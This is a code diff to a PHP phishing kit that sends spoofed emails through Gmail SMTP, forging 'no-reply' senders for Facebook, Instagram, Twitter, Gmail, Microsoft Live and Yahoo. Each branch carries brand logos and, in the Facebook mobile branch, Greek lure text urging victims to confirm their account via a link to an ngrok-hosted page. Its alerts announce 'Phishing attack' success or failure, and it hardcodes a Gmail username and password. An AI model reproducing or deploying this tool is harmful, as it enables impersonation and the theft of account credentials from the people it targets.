@@ -407,7 +407,11 @@ transform: scale(2);
         
              if (isset($_SESSION['site_hack']))             
                 {
-                 $link =  $_SESSION['site_hack'] .'@' .$_SESSION['site_hack'] .'com';
+                  $str_link =  $_SESSION['site_hack'];
+                  $str_link2 = str_replace("https://www.","",$str_link);
+                  $str_link3 = str_replace(".com","",$str_link2);
+                  $str_link4 = ucfirst($str_link3);
+                  $link =   "no-reply" ."@" .$str_link3 .".com";
                   }
 
 
@@ -417,14 +421,18 @@ transform: scale(2);
                   $str_link2 = str_replace("https://www.","",$str_link);
                   $str_link3 = str_replace(".com","",$str_link2);
                   $str_link4 = ucfirst($str_link3);
-                  $link =   "no-reply" ."@" .$str_link4 .".com";
+                  $link =   "no-reply" ."@" .$str_link3 .".com";
                    }
 
 
- 
 
- else if ($link == 'no-reply@Facebook_pc.com' or $link == 'no-reply@Facebook_tablet_mobile.com')
+
+ if ($link == 'no-reply@facebook_pc.com')
         {
+
+          $link = str_replace(".com_pc","",$str_link2);
+          $link =   "no-reply" ."@" .$link .".com";
+
 
       require "/var/www/clonenew/mail/PHPMailerAutoload.php";
 
@@ -452,9 +460,9 @@ $mail->Username = "makindosxx@gmail.com";
 
 $mail->Password = "mak*.m02m";
 
-$mail->SetFrom($link, $str_link4);
+$mail->SetFrom($link, $link);
 
-$mail->FromName = $str_link4;
+$mail->FromName = $link;
 
 
 $mail->AddEmbeddedImage('css/mail_pics/fb.png', 'fb');
@@ -494,14 +502,99 @@ $mail->AddAddress("$email");
        }
 
 
-      } // end if site ready facebook
+      } // end if site ready facebook pc
+ 
 
 
 
 
 
 
- else if ($link == 'no-reply@Instagram.com')
+else if ($link == 'no-reply@facebook_tablet_mobile.com')
+        {
+
+          $link = str_replace(".com_tablet_mobile","",$str_link2);
+          $link =   "no-reply" ."@" .$link .".com";
+
+
+      require "/var/www/clonenew/mail/PHPMailerAutoload.php";
+
+
+
+$mail = new PHPMailer(); // create a new object
+
+$mail->CharSet = 'UTF-8';
+
+$mail->IsSMTP(); // enable SMTP
+
+$mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
+
+$mail->SMTPAuth = true; // authentication enabled
+
+$mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
+
+$mail->Host = "smtp.gmail.com";
+
+$mail->Port = 465; // or 587
+
+$mail->IsHTML(true);
+
+$mail->Username = "makindosxx@gmail.com";
+
+$mail->Password = "mak*.m02m";
+
+$mail->SetFrom($link, $link);
+
+$mail->FromName = $link;
+
+
+$mail->AddEmbeddedImage('css/mail_pics/fb.png', 'fb');
+
+$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Facebook";
+
+$mail->Body = "<h2> <img src='cid:fb' height='24' width='24'> 
+                <font color='#45569C'>
+                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Facebook  
+                 </font>  
+              </h2> 
+               <br><br>
+               <a href='$ngrok' style='display: block; width: 17em; height: 1.2em; padding: 16px;
+                                                  text-align: center; border-radius: 3px; color: white;
+                                                  font-weight: bold; background:#45569C; color:white; 
+                                                  font-size: 14px; text-decoration: none'> 
+                Επιβεβαιώστε το λογαριασμό σας 
+                </a>";
+             
+
+$mail->AddAddress("$email");
+
+
+     if ($mail->Send()) 
+        {
+      // echo '<script type="text/javascript">alert("Phishing attack Successfully");
+        // </script>';
+        echo ("<script>location.href='/'</script>");
+         }
+
+
+     else 
+      {
+      echo '<script type="text/javascript">alert("Phishing attack failed");
+         </script>';
+       echo ("<script>location.href='/'</script>");
+       }
+
+
+      } // end if site ready facebook tablet and mobile
+
+
+
+
+
+
+
+
+ else if ($link == 'no-reply@instagram.com')
         {
 
       require "/var/www/clonenew/mail/PHPMailerAutoload.php";
@@ -530,9 +623,9 @@ $mail->Username = "makindosxx@gmail.com";
 
 $mail->Password = "mak*.m02m";
 
-$mail->SetFrom($link, $str_link4);
+$mail->SetFrom($link, $link);
 
-$mail->FromName = $str_link4;
+$mail->FromName = $link;
 
 
 $mail->AddEmbeddedImage('css/mail_pics/inst.png', 'inst');
@@ -580,7 +673,7 @@ $mail->AddAddress("$email");
 
 
 
-else if ($link == 'no-reply@Twitter.com')
+else if ($link == 'no-reply@twitter.com')
         {
 
       require "/var/www/clonenew/mail/PHPMailerAutoload.php";
@@ -609,9 +702,9 @@ $mail->Username = "makindosxx@gmail.com";
 
 $mail->Password = "mak*.m02m";
 
-$mail->SetFrom($link, $str_link4);
+$mail->SetFrom($link, $link);
 
-$mail->FromName = $str_link4;
+$mail->FromName = $link;
 
 
 $mail->AddEmbeddedImage('css/mail_pics/twitt.png', 'twitt');
@@ -659,7 +752,7 @@ $mail->AddAddress("$email");
 
 
 
-else if ($link == 'no-reply@Gmail.com')
+else if ($link == 'no-reply@gmail.com')
         {
 
       require "/var/www/clonenew/mail/PHPMailerAutoload.php";
@@ -688,9 +781,9 @@ $mail->Username = "makindosxx@gmail.com";
 
 $mail->Password = "mak*.m02m";
 
-$mail->SetFrom($link, $str_link4);
+$mail->SetFrom($link, $link);
 
-$mail->FromName = $str_link4;
+$mail->FromName = $link;
 
 
 $mail->AddEmbeddedImage('css/mail_pics/gm.png', 'gm');
@@ -741,8 +834,13 @@ $mail->AddAddress("$email");
 
 
 
-else if ($link == 'no-reply@Https://login.live.com')
+else if ($link == 'no-reply@https://login.live.com')
         {
+
+          $str_link2 = str_replace("https://","",$str_link);
+          $str_link3 = str_replace(".com","",$str_link2);
+          $link =   "no-reply" ."@" .$str_link3 .".com";
+
 
       require "/var/www/clonenew/mail/PHPMailerAutoload.php";
 
@@ -770,9 +868,9 @@ $mail->Username = "makindosxx@gmail.com";
 
 $mail->Password = "mak*.m02m";
 
-$mail->SetFrom($link, $str_link4);
+$mail->SetFrom($link, $link);
 
-$mail->FromName = $str_link4;
+$mail->FromName = $link;
 
 
 $mail->AddEmbeddedImage('css/mail_pics/hotm.png', 'hotm');
@@ -820,7 +918,7 @@ $mail->AddAddress("$email");
 
 
 
-else if ($link == 'no-reply@Yahoo.com')
+else if ($link == 'no-reply@yahoo.com')
         {
 
       require "/var/www/clonenew/mail/PHPMailerAutoload.php";
@@ -849,9 +947,9 @@ $mail->Username = "makindosxx@gmail.com";
 
 $mail->Password = "mak*.m02m";
 
-$mail->SetFrom($link, $str_link4);
+$mail->SetFrom($link, $link);
 
-$mail->FromName = $str_link4;
+$mail->FromName = $link;
 
 
 $mail->AddEmbeddedImage('css/mail_pics/yah.png', 'yah');
@@ -927,9 +1025,9 @@ $mail->Username = "makindosxx@gmail.com";
 
 $mail->Password = "mak*.m02m";
 
-$mail->SetFrom($link, $str_link4);
+$mail->SetFrom($link, $link);
 
-$mail->FromName = $str_link4;
+$mail->FromName = $link;
 
 
 $mail->AddEmbeddedImage('css/mail_pics/any.png', 'any');
